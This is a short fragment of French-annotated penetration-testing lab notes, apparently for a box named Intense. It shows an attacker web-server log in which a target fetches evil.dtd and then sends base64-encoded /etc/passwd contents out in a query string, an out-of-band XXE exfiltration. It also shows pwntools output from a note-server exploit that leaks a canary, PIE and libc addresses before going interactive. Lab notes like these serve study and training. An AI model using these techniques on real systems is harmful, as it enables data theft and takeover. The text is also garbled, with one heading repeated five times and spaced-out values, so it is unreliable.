python3 -m http.server 8080 10.10.10.41 - - [26/Oct/2022 11 :31:30] "GET /evil.dtd HTTP/1.1" 200 - 10.10.10.41 - - [26/Oct/2022 11 :31:30] "GET /? p = cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2J pbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lz Ong6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovY mluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOn g6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9 zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbW
```

## Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - Python one-liners / servers - intense
#cat/ATTACK/LISTEN-SERVE #cpts
extrait du PDF Joplin: intense

```
python pwn_noteserver.py [ + ] Opening connection to 127.0.0.1 on port 5001 : Done [ + ] Leaked canary: 0xbd427c6a61015100 [ + ] PIE leak : 0x56162ae55678 [ + ] Opening connection to 127.0.0.1 on port 5001 : Done [*] Loaded 14 cached gadgets for './note_server' [ + ] Libc leak : 0x7f83edf02eb0 [ + ] Opening connection to 127.0.0.1 on port 5001 : Done [*] Loaded 187 cached gadgets for '/usr/lib/libc.so.6' [*] Switching to interactive mode
```

